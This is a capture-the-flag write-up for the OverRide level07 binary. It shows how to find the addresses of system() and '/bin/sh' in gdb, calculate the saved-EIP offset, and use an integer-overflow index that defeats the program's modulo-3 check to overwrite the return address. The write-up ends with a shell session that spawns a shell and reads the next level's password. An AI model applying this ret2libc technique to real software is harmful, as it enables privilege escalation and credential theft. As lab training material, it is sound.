Introduction: 

We see that we have a programme that allow us to use 3 command: 

- Read
- Store
- Quit

I let you see explained disas source code in Ressources. 

But we can see that we can't store a number wich can bee divided by 3 ( X % 3 == 0)

We also see that we can read memory with negative number in index (it is not check)

There is no call to system so we'll do it ourself
-----------------------------------------------------------------------------------------------

STEP 1: Get System call in our hand

--> At the begining of the main we can see that env variable and argv are erase and set to 0 (cf memset / bzero like)

So we'll need to get system address thanks gdb:
(gdb) i f system
Stack frame at [[0xf7e6aed0]]:
 eip = 0x0; saved eip 0x0
 called by frame at 0xffffd4b8
 Arglist at 0xffffd4ac, args:
 Locals at 0xffffd4ac, Previous frame's sp is 0xffffd4b4
 Saved registers:
  eip at 0xffffd4b0

Here it is, system address: 0xf7e6aed0

STEP 2: Get system params

We want to execute a shell so we want something like "/bin/sh"

(gdb) find "/bin/sh"
evaluation of this expression requires the target program to be active
^
|_______ We need to know where it could be store

"https://stackoverflow.com/questions/19124095/return-to-lib-c-buffer-overflow-exercise-issue"

(gdb) r
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) find &system,+9999999,"/bin/sh"
[[0xf7f897ec]]
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

Here it is: /bin/sh address: 0xf7f897ec

STEP 3: GET THE EIP OFFSET

We cannot use a string with wire mask so we'll do it from scratch. 
1- Get address of our tab ( we see in disas main that our tab is store in $esp+0x8)
    (gdb) x/x $ebp+0x8
    0xffffd4e0:	[[0xffffd504]]
    ---> 0xffffd504 == 4294956292
2- Get the address of esp (at the end of the program because all the stack will be "unstacked"):
    (gdb) i f
Stack level 0, frame at 0xffffd6d0:
 eip = 0x80488ea in main; saved eip 0xf7e45513
 Arglist at 0xffffd6c8, args:
 Locals at 0xffffd6c8, Previous frame's sp is 0xffffd6d0
 Saved registers:
  ebx at 0xffffd6bc, ebp at 0xffffd6c8, esi at 0xffffd6c0, edi at 0xffffd6c4, eip at [[0xffffd6cc]]
q    ---> 0xffffd6cc == 4294956748

   4294956748 - 4294956292 = 456 ---> 456 / 4 == 114 

   114 is the Offset

STEP 3: Exec system /bin/sh

114 % 3 == 0 So we can't use this index cause it is reserved for will

So, We'll do an integer overflow: 

(0xffffffff) / 4 + Our Offset + 1 ==  0xffffffff / 4 + 114 + 1 = 1073741938
<--------->   <->            <--->
 uint32 max    |             Overflow     
            In code index is * 4 ( or <<  2)

So we've got, 
Command: Store
Number : Adresse of /bin/sh = 0xf7f897ec = 4160264172
Index : 116

Command: Store
Number: Adresse of system = 0xf7e6aed0 = 4159090384
Index: 1073741938


level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: qit
 Failed to do qit command
Input command: quit
$ whoami
level08
$ pwd
/home/users/level07
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
